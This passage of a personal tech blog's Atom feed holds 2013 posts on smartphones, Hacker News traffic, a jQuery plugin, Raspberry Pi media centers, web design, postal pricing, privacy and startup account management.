<p>These behaviors are different and yet they’re all converging on the phone. What they have in common is that <a href="http://online.wsj.com/article/SB10001424053111903480904576512250915629460.html" target="_blank">software is replacing hardware</a>. Hardware doesn’t need to become smarter, it just needs to be able to sync with our phones which can do the heavy lifting. The functionality then becomes limited by software which can be updated more cheaply and quickly than the hardware. It also solves the problem of hardware companies trying to develop software that results in a terrible user experience. Do cars really need the ability to <a href="http://www.cnn.com/2010/TECH/01/07/ford.twitter/index.html" target="_blank">read a Twitter</a> feed? And if they do, why not just do it via a simple Bluetooth connection and an audio streaming app on a phone?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>What does getting on the HN front page get you?</title>
   <link href="http://dangoldin.com/2013/04/19/what-does-getting-on-the-hn-front-page-get-you/"/>
   <updated>2013-04-19T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/19/what-does-getting-on-the-hn-front-page-get-you</id>
   <content:encoded><![CDATA[
<p>A week ago, I wrote a blog post and submitted to Hacker News. Within a few hours it made it to the front page and I wanted to share the aftermath.</p>

<ul>
    <li>The post generated ~29,000 visits to the blog post over the next few days with the biggest traffic spike occurring on Saturday.
        <img src="http://dangoldin.com/assets/static/images/ga-blog-post-spike.png" alt="GA Blog Post Spike" width="1167" height="420" layout="responsive"/>
    </li>
    <li>The post ended up being featured in the NY Times <a href="http://bits.blogs.nytimes.com/2013/04/12/todays-scuttlebot-e-mail-cachet-and-cellphone-dial-tones/" target="_blank">Bits blog</a> which accounted for ~2,900 of the total visits; the <a href="http://gizmodo.com/dial-tones/" target="_blank">Gizmodo network</a> which accounted for ~1,000; the Guardian, which accounted for ~100; and CNET which accounted for ~60.</li>
    <li>The way it spread is pretty interesting: I submitted to HN on Friday afternoon, it was picked up by the NY Times Bits Blog that evening and Gizmodo US on Saturday. After that, it expanded to the rest of the Gizmodo network, including the <a href="http://www.gizmodo.co.uk/2013/04/why-your-mobile-phone-doesnt-have-a-dial-tone/" target="_blank">UK</a> on Sunday and <a href="http://www.gizmodo.fr/2013/04/16/pourquoi-telephone-portable-tonalite.html" target="_blank">France</a> on Tuesday. <a href="http://www.cnet.com/8301-13952_1-57579660-81/the-404-1249-where-we-get-the-senior-discount-podcast/" target="_blank">CNET</a> and the <a href="http://www.guardian.co.uk/technology/blog/2013/apr/15/technology-links-newsbucket" target="_blank">Guardian</a> both picked it up on Monday.</li>
    <li>Gizmodo added an Amazon affiliate link to the book I quoted, The Idea Factory, but did me the favor of linking to my startup, Makers Alley. I suppose that makes us even.</li>
    <li>Only 80 people ended up visiting the <a href="https://makersalley.com/" target="_blank">Makers Alley</a> site, which is 1/3rd of one percent of the total visitors. These visits were pretty evenly split between the link in the Gizmodo article and the link from my blog.</li>
    <li>I have no idea why it took off and don’t consider it one of my better posts. I basically quoted a passage from a book and added a bit of my own commentary. I suspect the topic was appealing due to nostalgia and a bit of geek lore.</li>
    <li>It’s surprisingly hard to get on to the Hacker News home page these days but it does drive a significant amount of traffic. I joined HN five years ago and it was orders of magnitude easier to end up making it to the main page.</li>
    <li>If you write, do it for yourself and not for the recognition. And if you don’t write, start writing. Nathan Marz has a <a href="http://nathanmarz.com/blog/you-should-blog-even-if-you-have-no-readers.html" target="_blank">great post</a> that everyone who's interested in blogging should read.</li>
    <li>It’s great having my blog hosted on Github pages. It’s free and I don’t have to worry about server load.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Automatically add a “Follow on HN” link</title>
   <link href="http://dangoldin.com/2013/04/15/automatically-add-a-follow-this-discussion-on-hn-link/"/>
   <updated>2013-04-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/15/automatically-add-a-follow-this-discussion-on-hn-link</id>
   <content:encoded><![CDATA[
<p>This past weekend I wrote a <a href="https://github.com/dangoldin/follow-discussion-hn" target="_blank">small jQuery plugin</a> that automatically inserts a “Follow this discussion on Hacker News” link on a recently submitted web page. The motivation was to automate the current workflow that consists of first submitting a post to Hacker News, getting the URL of the comment thread, and then updating the original post to link to the thread. I also wanted to see if it could be done entirely in Javascript so that the code could be included on static HTML pages and not require a backend server.</p>

<p>After some research, I settled on the following approach:</p>

<ol>
  <li>Use <a href="https://www.firebase.com/" target="_blank">Firebase</a> to store a mapping of URL to the Hacker News thread id. I chose Firebase since it provides a way to read/write using Javascript.</li>
  <li>Use the <a href="http://hndroidapi.appspot.com" target="_blank">HN Droid API</a> to retrieve recently submitted HN posts for a given user via JSON.</li>
  <li>If any of the recently submitted posts match the provided url, store that thread id in Firebase and execute the user defined callback function.</li>
</ol>

<p>It works as expected but has a few limitations:</p>

<ol>
  <li>It relies on Firebase and doesn’t use authentication so someone can modify the database to point to another comment thread.</li>
  <li>It relies on a 3rd party Hacker News API so if that ever goes down it won’t be able to pull recently posted links to Hacker News.</li>
  <li>The HN API call only pulls the most recent submissions so the plugin will not be able to get the comment thread for older posts.</li>
  <li>Since Firebase prevents certain characters from being used in a key, I do some string replacement to clean the string which would allow someone to cause a string collision.</li>
  <li>The HN API isn’t real time and uses a cached version so it may take a bit of time for the link to get retrieved.</li>
  <li>The code hasn’t been thoroughly tested so may have some weird errors. It’s also my first “real” jQuery plugin so it may not follow best practices.</li>
</ol>

<p>In general, I’m a proponent of offloading as much work as possible to the client side and believe this will become the norm as the technology improves. We’re already using Disqus to handle comments and Firebase as a database and I expect more services to become available via client side Javascript. This will keep pages simple, reduce server costs, and outsource non-core components to specialized vendors.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Why don't cell phones have a dialtone?</title>
   <link href="http://dangoldin.com/2013/04/12/why-dont-cellphones-have-a-dialtone/"/>
   <updated>2013-04-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/12/why-dont-cellphones-have-a-dialtone</id>
   <content:encoded><![CDATA[
<p>While reading <a href="http://www.amazon.com/The-Idea-Factory-American-Innovation/dp/1594203288" target="_blank">The Idea Factory</a>, I came across an interesting passage that explained why cell phones don’t have dialtones:</p>

<blockquote>Meanwhile, Phil Porter, who had worked with [Richard] Frenkiel on the original system, came up with a permanent answer to an interesting question. Should a cellular phone have a dial tone? Porter made a radical suggestion that it shouldn’t. A caller should dial a number and then push “send.” That way, the mobile caller would be less rushed; also, the call would be connected for a shorter time, thus putting less strain on the network. That this idea—dial, then send—would later prove crucial to texting technology was not even considered.
</blockquote>

<p>It’s amazing that although this suggestion was made in 1971, we’re leveraging it more than 40 years later with text messaging. How many other technologies and businesses are built on top of SMS that wouldn’t have existed without this decision? I’m sure an SMS-like technology would have come along regardless of this decision but it still makes me wonder how significantly past technological decisions influence us in the present.</p>

<p>An additional meta thought: this is an example of one of those things that gladly lives in the subconscious that has no reason to bubble up to consciousness. I’m sure if someone were to ask me point blank to compare dialtones between landlines and cell phones I’d immediately get it but without a push I never would have thought of it. I wonder how many other connections there are stuck in our heads waiting for a spark to bring them into our consciousness.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Raspbmc</title>
   <link href="http://dangoldin.com/2013/04/10/raspbmc/"/>
   <updated>2013-04-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/10/raspbmc</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/raspberry-pi.jpg" alt="Raspberry Pi" width="300" height="377"/>
</div>

<p>I’ve been interested in the Raspberry Pi ever since I first saw it mentioned in the tech news and finally got to play with it over the past few days when my brother (thanks <a href="http://simongoldin.com/" target="_blank">Simon</a>!) lent me an extra one he had. I’ve been in need of a better media center setup ever since my DisplayPort cable stopped working so I decided to try out Raspbmc, a Raspberry Pi based media center.</p>

<p>I scavenged an SD card from my camera and a microUSB AC adapter from my old Droid phone which I somehow still had lying around. With those two, I was able to install Raspbmc but couldn’t get any farther without a wifi adapter. It took the wifi adapter a few days to get delivered but it worked right out of the box and I had a functional media center. Surprisingly, I didn’t need a keyboard at all and was able to run through the entire setup using SSH and a downloadable iPhone app that acts as a remote. The most time-consuming part was setting up a Samba shared folder under Mountain Lion and adding it to Raspbmc using the onscreen UI.</p>

<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/raspbmc-remote.png" alt="Raspbmc Remote" width="200" height="300"/>
</div>

<p>It works well. It solves my “must-have” problem of using my TV to play videos that are on my computer and also has a bunch of “nice-to-haves”. The two big ones are AirPlay support which allows streaming of audio and video from iOS devices and the ability to use my iPhone as a remote. Only thing left is getting an enclosure so it’s not just lying on the floor.</p>

<p>Here’s the setup:</p>

<ul class="bulleted">
    <li><a href="http://www.raspberrypi.org/" target="_blank">Raspberry Pi</a> - $25 or $35 model</li>
    <li><a href="http://www.newegg.com/Product/Product.aspx?Item=N82E16833315091" target="_blank">Wifi Adapter</a> - $10 on Newegg</li>
    <li>microUSB AC Adapter - I found one but should be around $5</li>
    <li>SD Card - I had one but can find one for around $6 on <a href="http://www.amazon.com/s/ref=sr_nr_n_1?rh=n%3A172282%2Cn%3A541966%2Cn%3A172456%2Cn%3A516866%2Cn%3A1197396%2Ck%3Asd+card+4gb&amp;keywords=sd+card+4gb&amp;ie=UTF8&amp;qid=1365618369&amp;rnid=493964" target="_blank">Amazon</a></li>
    <li>HDMI Cable - $2 and up on <a href="http://www.monoprice.com/" target="_blank">Monoprice</a></li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Coke, Pepsi and Passover</title>
   <link href="http://dangoldin.com/2013/04/05/coke-pepsi-and-passover/"/>
   <updated>2013-04-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/05/coke-pepsi-and-passover</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/pepsi-throwback.jpg" alt="Pepsi Throwback" width="300" height="200"/>
</div>

<p>During Passover, Coke and Pepsi sell sugar based versions of their sodas in order to stay kosher for Passover. These high fructose corn syrup (HFCS) free sodas are extremely popular and people stock up while they can. I don’t know whether this is due to the better taste, the nostalgia, or the limited supply but these sugar based versions are definitely more popular. I wonder what would happen if either Coke or Pepsi decided to go “all in” on sugar and launch a marketing campaign against HFCS based food and drinks. I’d love to look at the margins of sugar vs HFCS based sodas and see what the market share increase would need to be in order to offset the switch to sugar. My gut tells me that pursuing this strategy would be a win but the companies are too entrenched in their current process that it’s just not going to happen. Smaller soda manufacturers, such as Boylan, GuS, and Moxie, are growing by differentiating themselves from the big guys and are emphasizing the healthier ingredients. I’m hopeful that this will pressure Coke and Pepsi to make their soda healthier. Unfortunately, what’s more likely to happen is that they will just acquire the niche manufacturers position them to appeal to the more concious consumer, similar to what’s happening to <a href="http://brookstonbeerbulletin.com/the-big-brewers-brands/" target="_blank">craft breweries</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The new Gmail compose</title>
   <link href="http://dangoldin.com/2013/04/02/the-new-gmail-compose/"/>
   <updated>2013-04-02T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/04/02/the-new-gmail-compose</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/gmail_logo.png" alt="Gmail Logo" width="300" height="135"/>
</div>

<p>A few days ago, Google made the new compose default on Gmail. It went from a separate page to a popup that’s accessible from anywhere in Gmail. And for the vast majority of the time, it’s better: it’s quicker to get to and makes it easy to reference other emails while writing a new one. Unfortunately, for attaching an image (not embedding it inline) or doing some heavy formatting, it’s a huge step backwards and makes me want the old compose back.</p>

<p>I’m sure the data backed up the decision. Only a tiny fraction of all messages needed this additional functionality so why worry about it? The problem with this approach is that even taking into account the infrequency, the cost of the workaround is large enough to cause a usability problem for the power users. It’s akin to the <a href="http://dangoldin.com/2013/03/01/app-store-what-took-so-long/" target="_blank">old version</a> of the iOS App Store that would close itself every time you downloaded a new app. Sure that was great when you only wanted to download a single app but it made every other scenario significantly worse.</p>

<p>In the rush to be data driven, we shouldn’t forget the actual users and what they’re trying to do. A data driven approach should be used to improve our understanding, not replace it. Otherwise, we run the risk of “nice to have” features replacing the “must have” ones.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mailbox: Is the server required?</title>
   <link href="http://dangoldin.com/2013/03/29/mailbox-is-the-server-required/"/>
   <updated>2013-03-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/03/29/mailbox-is-the-server-required</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/mailbox1.png" alt="Mailbox" width="280" height="420"/>
</div>

<p>After a couple of weeks on the waiting list I finally got access to the Mailbox App. It’s a huge improvement over the standard mail app and my mobile email consumption habits have improved significantly. I’m still not at “inbox zero” but am making my way there.</p>

<p>I don’t know much about iOS development but one thing I’ve been wondering about is whether they could have written it to not use a remote server. Regarding scaling Mailbox, they <a href="http://www.mailboxapp.com/reservations/?p=1#were-ramping-up" target="_blank">wrote</a>:</p>

<blockquote><p>A critical part of Mailbox scaling is its brand new infrastructure. Mailbox relies on servers in the cloud to do things like send push notifications, download email as fast as possible, and handle “snoozed” messages.</p></blockquote>

<p>From reading developer docs, it does seem you need a server to do push notifications but I wonder if there’s a way to schedule notifications on the client side. Conceptually, there’s nothing the server needs to do that can’t be done client side via simple polling. This way, the server load becomes non existent and scaling issues are avoided. Even a hybrid approach could have worked: use the server approach when possible but fall back to polling if the servers are overwhelmed. I just can’t help but think that there must have been a way to have the same functionality client-side. The cynic in me wants to say that it was done to build up hype but it’s equally likely that I just don’t know iOS development. It seems odd that crippling an app would help with marketing. I hope that’s not what it takes to sell for $100M.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Welcoming the long, single webpage</title>
   <link href="http://dangoldin.com/2013/03/26/welcoming-the-long-single-webpage/"/>
   <updated>2013-03-26T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/03/26/welcoming-the-long-single-webpage</id>
   <content:encoded><![CDATA[
<p>A recent trend in website design I’ve been seeing is the long single page. My first distinct memory of seeing it is from <a href="https://yourkarma.com/" target="_blank">Karma</a> but I’ve started noticing it everywhere. It runs the gamut from non-profit <a href="http://www.weheartwifi.com/" target="_blank">causes</a> to video game <a href="http://www.sandboxstrat.com/" target="_blank">PR firms</a>. In fact, we’re even using this approach for the Makers Alley <a href="https://makersalley.com/" target="_blank">homepage</a>.</p>

<p>Surprisingly, it’s starting to make inroads on news sites as well. Whereas before news sites would have an article spread across 20 pages (looking at you Business Insider) in order to increase page views and show more ads, some news outlets are actually improving the user experience. Both <a href="http://apps.npr.org/unfit-for-work/" target="_blank">NPR</a> and the <a href="http://www.washingtonpost.com/sf/sports/wp/2013/02/27/cyclings-road-forward/" target="_blank">Washington Post</a> have posted pieces that leverage this approach and it creates a significantly more engaging read. It’s a pleasure reading long form content this way, richer media adds to the experience and minimizing mouse clicks avoids the disruption of a page load.</p>

<p>I hope it stays.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Email addresses are private?</title>
   <link href="http://dangoldin.com/2013/03/24/email-addresses-are-private/"/>
   <updated>2013-03-24T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/03/24/email-addresses-are-private</id>
   <content:encoded><![CDATA[
<p>Last week, Andrew “weev” Aurenheimer, was sentenced to 41 months for going through publicly accessible AT&amp;T URLs which exposed the email address of 114,000 iPad owners. I don’t want to talk get into the absurdity of the sentence or how AT&amp;T should be the one held accountable for this “<a href="http://en.wikipedia.org/wiki/Security_through_obscurity" target="_blank">security</a>.”</p>

<p>I’m more interested in the fact that people still consider an email address to be private information (although I do realize that the leak also revealed iPad ownership information). This may have been the case years ago when we arrived on the internet but right now, our email addresses are everywhere. We give it to every new website we sign up for and we display it proudly on our websites. I’m sure my email address appears on dozens of spam lists for sale on the internet. Google already gives 3000 results when I search for my email address.</p>

<p>The definition of what is and is not private changes as a society evolves. Technology has been increasing the pace and society has yet to catch up. Most of the people in the tech world are pretty aware of the trends but the majority of people are surprised by how much information they’re sharing whenever they touch a digital device. And it’s only going to get worse. If we’re this concerned about our email addresses, how will we feel when people use Google Glass to look up our Facebook or LinkedIn profiles just by looking at us?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>One art, please</title>
   <link href="http://dangoldin.com/2013/03/20/one-art-please/"/>
   <updated>2013-03-20T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/03/20/one-art-please</id>
   <content:encoded><![CDATA[
<p>At the beginning of 2013, I set a <a href="http://dangoldin.com/2013/01/02/2013-goals/" target="_blank">goal</a> to do something with my hands to contrast with the constant life in front of the screen. I finally finished my first “art” project this past weekend and documented the result. I had a stash of old, torn jeans that were just taking up space and instead of throwing them out I decided to have some fun. Here’s the process and end result.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/1-art.jpg" alt="Silhouette of the NYC skyline" width="800" height="600" layout="responsive"/>
      <p>1. Find a silhouette of the NYC skyline</p>
    </div>
  </li>
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/2-art.jpg" alt="Arrangement of jean pieces" width="800" height="600" layout="responsive"/>
      <p>2. Replicate the silhouette by cutting pieces out of old jeans and arranging them on a piece of cardboard wrapped in another shade of jeans.</p>
    </div>
  </li>
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/3-art.jpg" alt="Fabric glue" width="800" height="1067" layout="responsive"/>
      <p>3. Use some fabric glue to attach the pieces to the canvas</p>
    </div>
  </li>
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/4-art.jpg" alt="Resulting art" width="800" height="600" layout="responsive"/>
      <p>4. The result - now all it needs is a frame</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Makers Alley v2</title>
   <link href="http://dangoldin.com/2013/03/16/makers-alley-v2/"/>
   <updated>2013-03-16T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/03/16/makers-alley-v2</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/ma-logo-square.png" alt="Makers Alley" width="200" height="200"/>
</div>

<p>A brief one today.</p>

<p>This past week, Sandy and I have been super busy getting a new version of <a href="https://makersalley.com/" target="_blank">Makers Alley</a> out that allows you to customize and buy furniture. We’re launching with two makers that have items for sale but we’re busy adding more. <a href="https://makersalley.com/maker/withers-and-grain/" target="_blank">Withers &amp; Grain</a> specialize in using reclaimed wood from the 5 boroughs and do their own wood and metal work. <a href="https://makersalley.com/maker/mark-grattan-design-and-build/" target="_blank">Mark Grattan</a> is a furniture designer who has designed a furniture collection for Makers Alley in a geometry-inspired style. Take a look at their pages, watch their videos, and customize their pieces. If you have any feedback let me know.</p>

<div class="video-holder">
  <amp-vimeo data-videoid="60489360" layout="responsive" width="600" height="340"></amp-vimeo>
</div>

<div class="video-holder">
  <amp-vimeo data-videoid="60490611" layout="responsive" width="600" height="340"></amp-vimeo>
</div>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Mmmm... pseudo static sites</title>
   <link href="http://dangoldin.com/2013/03/12/mmmm-pseudo-static-sites/"/>
   <updated>2013-03-12T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2013/03/12/mmmm-pseudo-static-sites</id>
   <content:encoded><![CDATA[
<p>Reading <a href="http://blog.apps.npr.org/2013/02/14/app-template-redux.html" target="_blank">Katie Zhu’s post</a> on NPR’s news app architecture got me curious about a setup where most of the content is static and can be hosted on S3 and EC2 is primarily used to generate the static content which is then uploaded to S3. The benefits were obvious:</p>

<ul>
<li><strong>Cost:</strong> S3 is cheaper than EC2.</li>
<li><strong>Reliable:</strong> S3 doesn’t go down near as frequently as EC2.</li>
<li><strong>Scalable:</strong> Since it’s primarily static you don’t have to worry about additional capacity or dealing with caching, databases, and all the other fun things.</li>
<li><strong>Simpler:</strong> There are no weird server issues here. As long as you generate the right content and your rendering is good, you don’t need to worry about a web server acting up.</li>
</ul>

<p>I’ve been meaning to write a script that would scrape Hacker News in order to show me the top content I missed while sleeping. I had some time this weekend and decided to give it a go using this “pseudo-static” approach. The result is called Yet Another Hacker News Reader (<a href="http://yahnr.dangoldin.com/" target="_blank">YAHNR</a>) and you can take a look at the code on <a href="https://github.com/dangoldin/yahnr" target="_blank">GitHub</a>. Turns out it was pretty simple to write and the most difficult part was thinking differently about the problem. Whereas I’d keep the content in a database I ended up storing them in static JSON files and instead of having the logic to generate the HTML page live on a web server I have it using Mustache templates.</p>

<p>I’ve become a fan of this approach and think every developer should try it out. It offers a new perspective and most apps will have some components that’ll be able to leverage this sort of setup. Right now, if you run a static blog and want comments, you can use <a href="http://disqus.com/" target="_blank">Disqus</a>. You can use <a href="https://www.firebase.com/" target="_blank">Firebase</a> to build entire web apps that do all the work on the client side. As more and more services become available via Javascript, this approach becomes more and more practical.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Just do the work</title>
   <link href="http://dangoldin.com/2013/03/09/just-do-the-work/"/>
   <updated>2013-03-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/03/09/just-do-the-work</id>
   <content:encoded><![CDATA[
<p>Entrepreneurs are familiar with the elevator pitch. The idea is to give a pitch in 30 seconds (the duration of an elevator ride) that is compelling enough to an investor that it leads to a follow up meeting where you can go through your pitch deck. An entrepreneur coming up with an elevator pitch is similar to a politician trying to come up with sound bites that are easily digestible, look good on the news, and stick in people’s minds.</p>

<p>Why are we so intent on diluting our message? So much substance is lost when we simplify and condense. We mock politicians when they speak in sound bites and yet we do the same thing when we pitch investors. We both want to draw attention to ourselves and stay top of mind but why take shortcuts? Investors will come to you if you build a great product, get customers, and generate revenue. Voters will support you if you empathize with them and support their community. We need to stop looking for the easy way out and just do the work, success will follow.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Discriminatory Pricing in the Post Office</title>
   <link href="http://dangoldin.com/2013/03/05/discriminatory-pricing-in-the-post-office/"/>
   <updated>2013-03-05T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/03/05/discriminatory-pricing-in-the-post-office</id>
   <content:encoded><![CDATA[
<p>I recently came across Jeff Jordan’s <a href="http://jeff.a16z.com/2012/10/30/avoiding-financial-armageddon-at-the-post-office/" target="_blank">post</a> about revamping the post office so it’s no longer losing more than $5 billion a year. Jeff suggests the obvious solution of raising prices but I think a more clever approach would be to start price discriminating. Everyone who needs to mail a letter has to pay 46 cents for a stamp but why not come up with tiered pricing. People who need to send something urgently can pay more than a dollar while others who only care that the letter arrives can pay 20 cents. The postal service would need to ensure their systems are able to track how full or empty each shipment is but this would allow them to ship the cheaper, less urgent mail with the more urgent mail to maximize the shipping space. Another way to price discriminate would be to give a discount for mail that’s picked up at the post office within a few days rather than being delivered to the home.</p>

<p>I took a quick look at the USPS <a href="http://about.usps.com/who-we-are/financials/welcome.htm" target="_blank">financials for 2012</a> and if the average price of a first class delivery increases from 42 cents to 52 cents, the post office would be profitable given the same volume. I realize that’s a 24% jump in price but if it’s done via a price discriminatory approach, such as introducing multiple price points based on delivery guarantees, it won’t feel as drastic.</p>

<table class="table">
    <thead>
        <tr>
            <th>Service Line</th>
            <th>Revenue</th>
            <th>Volume</th>
            <th>Unit Price</th>
            <th>New Price</th>
            <th>New Revenue</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>First Class</td>
            <td>$28,867</td>
            <td>68,696</td>
            <td>$0.42</td>
            <td class="highlight">$0.52</td>
            <td class="highlight">$35,721</td>
        </tr>
        <tr>
            <td>Standard</td>
            <td>$16,428</td>
            <td>79,496</td>
            <td>$0.21</td>
            <td>$0.21</td>
            <td>$16,428</td>
        </tr>
        <tr>
            <td>Shipping + Packages</td>
            <td>$11,596</td>
            <td>3,502</td>
            <td>$3.31</td>
            <td>$3.31</td>
            <td>$11,596</td>
        </tr>
        <tr>
            <td>International</td>
            <td>$2,816</td>
            <td>926</td>
            <td>$3.04</td>
            <td>$3.04</td>
            <td>$2,816</td>
        </tr>
        <tr>
            <td>Periodicals</td>
            <td>$1,731</td>
            <td>6,741</td>
            <td>$0.26</td>
            <td>$0.26</td>
            <td>$1,731</td>
        </tr>
        <tr>
            <td>Other</td>
            <td>$3,785</td>
            <td>498</td>
            <td>$7.60</td>
            <td>$7.60</td>
            <td>$3,785</td>
        </tr>
        <tr>
            <td>Total</td>
            <td>$65,223</td>
            <td>159,859</td>
            <td>$0.41</td>
            <td>$0.45</td>
            <td class="highlight">$72,078</td>
        </tr>
    </tbody>
</table>

<p>Airlines have been price discriminating since Sabre launched in the 60’s, coupons have been around for 100 years now, and retailers have been offering discounts on out of season items for even longer. Hardware and software improvements are streamlining operations all over the place and are allowing companies to price more efficiently than ever. I’d love to see the government do the same.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>App Store, what took so long?</title>
   <link href="http://dangoldin.com/2013/03/01/app-store-what-took-so-long/"/>
   <updated>2013-03-01T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/03/01/app-store-what-took-so-long</id>
   <content:encoded><![CDATA[
<p>In old versions of the iOS App Store, every time you downloaded a new app it would close the App Store and navigate to the screen with the now-downloading app. Recent versions of the App Store keep it open and force you explicitly exit. I’m surprised that the App Store didn’t launch with the new behavior - it must have been a conscious decision since the development effort for both seems similar.</p>

<p>The only time the original approach is faster is when users intend to download a single app. I suspect this is actually the most common scenario and someone at Apple decided to design the App Store to optimize for it. Unfortunately, they didn’t consider the frustration of having to download multiple apps - even if one only does this a fraction of the time. Training yourself to hit the home button after downloading a new app is a lot easier than training yourself to scroll to the App Store icon, clicking on it, and resuming the app search. Even if 90% of the time a user is only downloading a single app, the other 10% matters is significant given a large enough cost. One can forgive Apple for launching the iPhone with this behavior - no one knew how people would use the App Store. But why did it take years to release the update?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Book Review: Liars and Outliers</title>
   <link href="http://dangoldin.com/2013/02/26/book-review-liars-and-outliers/"/>
   <updated>2013-02-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/26/book-review-liars-and-outliers</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/liars-and-outliers-cover.jpg" alt="Liars and Outliers Book Cover" width="600" height="900"/>
</div>

<p>I’ve been a fan of Bruce Schneier ever since I read his <a href="http://www.schneier.com/blog/archives/2009/11/beyond_security.html" target="_blank">post about security theater</a> in the post 9/11 world. As soon as I discovered that he wrote a book, <a href="http://www.amazon.com/Liars-Outliers-Enabling-Society-Thrive/dp/1118143302">Liars and Outliers</a>, I added it to my to-read list and just finished reading it over the weekend. It’s one of those books that is obvious as you read it but spawns a ton of thoughts. He develops a framework that he uses to analyze security and trust in individuals, organizations, and differently-sized societies.</p>

<p>Trust is the foundation that’s allowing the world to become faster paced and interconnected. We’re interacting with people all across the globe, our organizations and businesses are larger than ever, and we’re more dependent on technology than ever. Modern life depends on these complex trust systems and Schneier does a great job explaining the various interactions and the impact technology is having. As others have said, the 21st century will be about data and the rise of social networks, wearable computers, and the quantified self movement are an indicator of the type of data that will be collected. We need to make sure proper systems are in place to prevent abuse and Liars and Outliers provides a great framework to think about these issues and prepare us for the data century.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Account management madness</title>
   <link href="http://dangoldin.com/2013/02/25/account-management-madness/"/>
   <updated>2013-02-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/25/account-management-madness</id>
   <content:encoded><![CDATA[
<div class="right10">
  <img src="http://dangoldin.com/assets/static/images/google-accounts.png" alt="My Google Accounts" width="332" height="460"/>
</div>

<p>Over the past year, I cofounded two startups and launched a bunch of side projects. Since they all had potential, I wanted to make each as standalone as possible and ended up with dedicated accounts for each. This meant that I had a flood of accounts for each, ranging from the various Google products to Sendgrid and AWS to Freshbooks and Quickbooks. Unsurprisingly, this turned out to be an unmanageable pain in the ass.</p>

<p>It gets worse. We ran into a trademark issue and had to change our company name from Glossi to <a href="http://getpressi.com" target="_blank">Pressi</a> and transfer our branded assets. This meant handing over our domain and since we’re heavy users of Google’s products, losing access to our email, our documents, and our calendars. To migrate, we had the great fortune of having to forward the important emails and share the important documents to our new account.</p>

<p>This led to me an epiphany that we’re using today. Only have unique email. Everything else can be managed through individual accounts until it’s necessary to create company accounts. And even then, only create accounts that are absolutely necessary, which will typically be the financially dependent ones (Freshbooks, Stripe, etc). This allows us to not worry about having a flood of Google tabs open and we get to avoid the adventure of figuring out whether a doc we’re looking for has been shared on a personal or company account. When something does need to be shared with someone outside the company, we share it with our corporate clone and manage it from there.</p>

<p>By no means is this a perfect solution but it works for me and I only wish I stumbled unto it sooner. How do you make it work?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Vacationing with Foursquare</title>
   <link href="http://dangoldin.com/2013/02/22/vacationing-with-foursquare/"/>
   <updated>2013-02-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2013/02/22/vacationing-with-foursquare</id>
   <content:encoded><![CDATA[
<ul class="thumbnails">
  <li class="span6">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/nola-trip-map.png" alt="My NOLA trip map" width="640" height="383" layout="responsive"/>
    </div>
  </li>
</ul>

<p>Last week, my wife and I took a vacation to New Orleans and it was the first time we used Foursquare to plan a trip. I asked friends for suggestions, looked at other Foursquare lists, and did some online research to create <a href="https://foursquare.com/dangoldin/list/nola-trip" target="_blank">my list</a> of 25 places that I wanted to visit while there. These places ranged from tourist magnets such as Bourbon Street and Cafe Du Monde to the more local places like Cafe Envie and Port of Call. Our typical approach in New Orleans was to go to a neighborhood we wanted to explore and then visit the places that were nearby on our Foursquare lists. Out of the 25 places I had on my list, I ended up visiting 16 which is a bit low but I made up for that by visiting a bunch of local places that I wouldn’t have discovered otherwise.</p>

